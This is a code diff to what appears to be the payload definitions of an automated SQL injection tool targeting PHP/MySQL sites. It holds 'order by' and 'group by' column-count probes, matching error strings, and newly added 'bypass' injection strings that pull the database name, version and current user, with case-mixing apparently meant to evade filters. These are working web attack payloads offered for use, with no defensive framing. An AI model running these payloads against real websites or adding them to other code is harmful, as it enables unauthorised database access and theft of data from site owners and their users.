@@ -19,14 +19,12 @@ define_error_list_php = [
 #This is order by command and it bypass
 define_order_by_command_php = [
     " order by 1000",
-    " order by 1000 %23",
-    " group by 1000",
-    " group by 1000 %23"
+    " group by 1000"
 ]
 
 #order by errors
 define_error_order_by_php = [
-    "Unknown column '1000' in 'order clause'"
+    "column '1000' in 'order clause'"
 ]
 
 #Order by in php End
@@ -40,12 +38,24 @@ define_database_detection_query_php = [
     " cOncAt(\'FINDDATABASE=>\' , dAtaBaSe(),  \'<=FINDDATABASE\')"
 ]
 
+define_database_detection_query_php_bypass = [
+    " ConcAt(QUOTE(2134115356), dAtaBaSe(), QUOTE(62134115356))"
+]
+
 define_version_detection_query_php = [
     " cOncAt(\'FINDVERSION=>\' , VERsion(),  \'<=FINDVERSION\')"
 ]
 
+define_version_detection_query_php_bypass = [
+    " cOncAt(QUOTE(2134115356) , VERsion(),  QUOTE(62134115356))"
+]
+
 define_user_detection_query_php = [
     " cOncAt(\'FINDUSER=>\' , UseR(),  \'<=FINDUSER\')"
+]
+
+define_user_detection_query_php_bypass = [
+    " cOncAt(QUOTE(2134115356) , UsEr(),  QUOTE(62134115356))"
 ]
 
 define_get_tables_name_query_php = [
